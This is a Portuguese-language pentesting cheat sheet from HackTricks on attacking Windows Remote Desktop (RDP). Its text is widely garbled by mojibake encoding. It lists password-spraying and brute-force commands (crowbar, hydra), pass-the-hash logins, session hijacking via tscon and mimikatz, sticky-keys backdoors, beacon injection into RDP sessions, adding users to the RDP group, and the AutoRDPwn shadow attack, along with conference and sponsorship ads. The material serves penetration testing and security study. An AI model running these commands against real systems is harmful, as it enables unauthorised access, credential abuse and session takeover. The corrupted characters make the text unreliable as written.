## Informa√ß√µes B√°sicas

O Protocolo de √Årea de Trabalho Remota (**RDP**) √© um protocolo propriet√°rio desenvolvido pela Microsoft, que fornece uma interface gr√°fica para o usu√°rio se conectar a outro computador por meio de uma conex√£o de rede. O usu√°rio utiliza software cliente **RDP** para esse fim, enquanto o outro computador deve executar software servidor **RDP** (daqui [aqui](https://en.wikipedia.org/wiki/Remote\_Desktop\_Protocol)).

**Porta padr√£o:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Enumera√ß√£o

### Autom√°tica
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
Verifica a criptografia dispon√≠vel e a vulnerabilidade DoS (sem causar DoS ao servi√ßo) e obt√©m informa√ß√µes do Windows NTLM (vers√µes).

### [For√ßa bruta](../generic-methodologies-and-resources/brute-force.md#rdp)

**Cuidado, voc√™ pode bloquear contas**

### **Spray de senha**

**Cuidado, voc√™ pode bloquear contas**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Conectar com credenciais/hash conhecidas
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Verificar credenciais conhecidas em servi√ßos RDP

O rdp\_check.py do Impacket permite verificar se algumas credenciais s√£o v√°lidas para um servi√ßo RDP:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

A [Confer√™ncia de Seguran√ßa DragonJAR](https://www.dragonjarcon.org/) √© um evento internacional de ciberseguran√ßa com mais de uma d√©cada de exist√™ncia que ser√° realizada nos dias 7 e 8 de setembro de 2023 em Bogot√°, Col√¥mbia. √â um evento com grande conte√∫do t√©cnico onde s√£o apresentadas as √∫ltimas pesquisas em espanhol que atraem hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org/" %}

## **Ataques**

### Roubo de sess√£o

Com **permiss√µes do sistema**, voc√™ pode acessar qualquer **sess√£o RDP aberta por qualquer usu√°rio** sem precisar saber a senha do propriet√°rio.

**Obter sess√µes abertas:**
```
query user
```
**Acesso √† sess√£o selecionada**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Agora voc√™ estar√° dentro da sess√£o RDP selecionada e ter√° que se passar por um usu√°rio usando apenas ferramentas e recursos do Windows.

**Importante**: Quando voc√™ acessa uma sess√£o RDP ativa, voc√™ encerra a sess√£o do usu√°rio que a estava usando.

Voc√™ poderia obter senhas do processo fazendo dump, mas este m√©todo √© muito mais r√°pido e permite que voc√™ interaja com as √°reas de trabalho virtuais do usu√°rio (senhas no bloco de notas sem serem salvas no disco, outras sess√µes RDP abertas em outras m√°quinas...)

#### **Mimikatz**

Voc√™ tamb√©m pode usar o mimikatz para fazer isso:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

Combinando esta t√©cnica com **stickykeys** ou **utilman**, voc√™ ser√° capaz de acessar um CMD administrativo e qualquer sess√£o RDP a qualquer momento.

Voc√™ pode procurar RDPs que j√° tenham sido backdoorizados com uma dessas t√©cnicas usando: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### Inje√ß√£o de Processo RDP

Se algu√©m de um dom√≠nio diferente ou com **privil√©gios melhores fizer login via RDP** no PC onde **voc√™ √© um administrador**, voc√™ pode **injetar** seu beacon no **processo da sess√£o RDP** dele e agir como ele:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Adicionando usu√°rio ao grupo RDP
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Ataque Shadow

**AutoRDPwn** √© um framework de p√≥s-explora√ß√£o criado em Powershell, projetado principalmente para automatizar o ataque **Shadow** em computadores Microsoft Windows. Essa vulnerabilidade (listada como uma funcionalidade pela Microsoft) permite que um atacante remoto **visualize a √°rea de trabalho de sua v√≠tima sem seu consentimento**, e at√© mesmo controle-a sob demanda, usando ferramentas nativas do pr√≥prio sistema operacional.

{% embed url="https://github.com/JoelGMSec/AutoRDPwn" %}

## Comandos Autom√°ticos HackTricks
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for RDP
  Note: |
    Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software 

    https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
  Name: Nmap
  Description: Nmap with RDP Scripts
  Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**A Confer√™ncia de Seguran√ßa DragonJAR √© um evento internacional de ciberseguran√ßa**](https://www.dragonjarcon.org/) com mais de uma d√©cada de exist√™ncia que ser√° realizada nos dias 7 e 8 de setembro de 2023 em Bogot√°, Col√¥mbia. √â um evento com grande conte√∫do t√©cnico onde s√£o apresentadas as √∫ltimas pesquisas em espanhol que atraem hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
